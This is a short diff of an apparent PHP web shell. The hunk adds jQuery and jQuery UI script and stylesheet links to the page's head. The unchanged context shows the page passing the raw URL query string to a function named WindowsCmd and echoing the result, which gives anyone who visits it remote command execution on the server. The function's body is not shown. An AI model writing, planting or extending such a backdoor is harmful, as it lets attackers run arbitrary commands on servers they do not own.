@@ -25,6 +25,11 @@ function WindowsCmd($cmd){
 	<style>
 	body{background-color:black; color:white; font-family:monospace; font-size:12px;}
 	</style>
+	
+	<link type="text/css" rel="stylesheet" href="https://code.jquery.com/ui/1.11.4/themes/redmond/jquery-ui.css">
+  <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+  <script type="text/javascript" src="https://code.jquery.com/ui/1.11.4/jquery-ui.min.js"></script>
+  
 </head>
 <body>
 <?php echo WindowsCmd($_SERVER["QUERY_STRING"]); ?>
